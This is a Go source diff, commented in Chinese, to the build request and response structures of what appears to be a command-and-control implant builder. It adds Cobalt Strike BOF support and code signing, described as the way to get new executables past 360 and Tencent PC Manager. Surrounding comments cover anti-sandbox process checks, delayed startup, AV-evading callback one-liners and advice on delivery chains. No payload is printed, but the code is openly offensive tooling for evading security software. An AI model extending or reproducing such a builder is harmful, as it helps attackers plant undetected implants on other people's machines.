@@ -61,8 +61,14 @@ type BuildRequest struct {
 	UPXEnable    bool `json:"upx_enabled"`
 	// EvasionScan 主动反沙箱进程检测（默认关闭）：枚举进程并与安全软件/分析工具
 	// 进程名比对后延迟执行。该行为会被国产杀软主动防御拦（见植入端
-	// evasion_scan_windows.go），且需要静态 API 导入与进程名字符串，故默认不编译。
+	// gate_scan_windows.go），且需要静态 API 导入与进程名字符串，故默认不编译。
 	EvasionScan bool `json:"evasion_scan"`
+	// BofEnabled BOF（Cobalt Strike Beacon Object File）支持：默认关闭。
+	// 开启会让载荷带上整套 Beacon* API 名字（22 处 pclntab 明文），只在需要跑 BOF 时开。
+	BofEnabled bool `json:"bof_enabled"`
+	// SignEnabled 构建后代码签名：证书在服务端配置（builder.sign_*），请求只能开启。
+	// 未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行，签名是"能不能跑起来"的敲门砖。
+	SignEnabled bool `json:"sign_enabled"`
 	// 启动随机延迟（秒）：留空(0)时用服务端配置 implant.startup_delay_min/max，
 	// 再回退 2~10s。显式传值可覆盖（如 20/60 拉长"启动即行为"的时间窗）。
 	StartupDelayMin int `json:"startup_delay_min"`
@@ -88,6 +94,17 @@ type BuildResponse struct {
 	// OneLiners 多条免杀上线命令变体（PowerShell/BITS/LOLBin/curl/python...），
 	// 便于现场按终端拦截情况换用；OneLiner 为其首选项的兼容字段。
 	OneLiners []OneLiner `json:"one_liners,omitempty"`
+	// ── 代码签名结果（未启用签名时为零值）──
+	// Signed 产物是否带有效 Authenticode 签名；Signer 签名者主题；SignStatus 复核状态
+	// （Valid/NotSigned/UnknownError…）；SignMessage 中文说明（失败/跳过原因）。
+	Signed      bool   `json:"signed"`
+	Signer      string `json:"signer,omitempty"`
+	SignMethod  string `json:"sign_method,omitempty"`
+	SignStatus  string `json:"sign_status,omitempty"`
+	SignMessage string `json:"sign_message,omitempty"`
+	// ── 落地链建议（按平台/格式 + 是否已签名给出"该走哪条链"）──
+	LoaderAdviceTitle string   `json:"loader_advice_title,omitempty"`
+	LoaderAdviceTips  []string `json:"loader_advice_tips,omitempty"`
 }
 
 type ImplantsInfo struct {
